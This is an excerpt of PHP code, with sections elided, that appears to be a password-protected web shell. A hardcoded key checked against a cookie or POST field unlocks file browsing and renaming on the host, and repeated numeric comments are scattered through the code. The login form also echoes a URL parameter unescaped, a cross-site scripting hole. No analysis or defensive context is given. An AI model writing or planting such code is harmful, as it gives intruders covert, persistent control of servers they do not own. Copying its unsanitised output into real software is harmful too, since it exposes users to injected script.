...
$auth_key = "25887f2e9c8dbae212da7ff2310a1349";
...
$pass = false;
if (isset($_COOKIE['pw_name_81145'])) {
    if(($_COOKIE['pw_name_81145']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_81145'])) {
        if(($_POST['pw_name_81145']) == $auth_key) {
            setcookie("pw_name_81145", $_POST['pw_name_81145']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_81145' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1724596723170086 1724596723169450 1724596723383506 1724596723323255
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1724596723170086 1724596723169450 1724596723383506 1724596723323255
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1724596723170086 1724596723169450 1724596723383506 1724596723323255
            $name = PATH . "/" . $_GET['r'];
